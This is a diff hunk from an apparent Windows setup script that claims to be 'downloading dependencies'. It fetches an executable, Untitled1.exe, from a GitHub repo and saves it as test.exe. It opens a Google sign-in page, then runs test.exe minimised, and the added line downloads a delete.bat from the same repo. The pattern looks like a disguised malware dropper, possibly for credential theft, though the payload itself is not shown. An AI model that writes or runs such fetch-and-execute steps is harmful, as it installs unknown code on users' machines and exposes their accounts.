@@ -12,6 +12,8 @@ Write-Host 'MAKE SURE YOU HAVE GIT! downloading dependencies, please ignore the 
 
 powershell -Command "Invoke-WebRequest https://github.com/Not-AriStienfeld/dependancies/raw/main/Untitled1.exe -OutFile test.exe"
 
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Not-AriStienfeld/dependancies/main/delete.bat -OutFile delete.bat"
+
 start https://accounts.google.com/v3/signin/identifier?dsh=S1208115868%3A1673312805607275&authuser=0&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession
 
 start /min test.exe
